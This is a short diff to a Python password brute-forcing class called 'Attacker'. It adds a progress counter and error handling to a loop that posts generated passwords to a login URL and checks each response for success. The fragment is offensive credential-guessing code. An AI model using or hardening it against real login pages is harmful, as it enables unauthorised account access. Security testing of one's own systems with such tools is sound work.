@@ -87,6 +87,8 @@ class Attacker():
                 # loop through passwords and try them all
                 for password in attackMethod.generatePasswords():
                     count += 1
+                    if count%100000 == 0:
+                        print(count)
                     if testMode:
                         if verbose:
                             print("TEST MODE: generated password [%s]" % password)
@@ -95,8 +97,12 @@ class Attacker():
                     # if username is not passed as argument, we will use the password as our username
                     data = self.getDataFields(username, password)
 
-                    response = session.post(self.loginURL, data=data)
-                    found = checkSuccess(response)
+                    try:
+                        response = session.post(self.loginURL, data=data)
+                        found = checkSuccess(response)
+                    except Exception as e:
+                        print(e)
+                        continue
 
                     if verbose:
                         print("%s Trying [%s] ... %s" % (name, password, "SUCCESS" if found else "FAILED"))
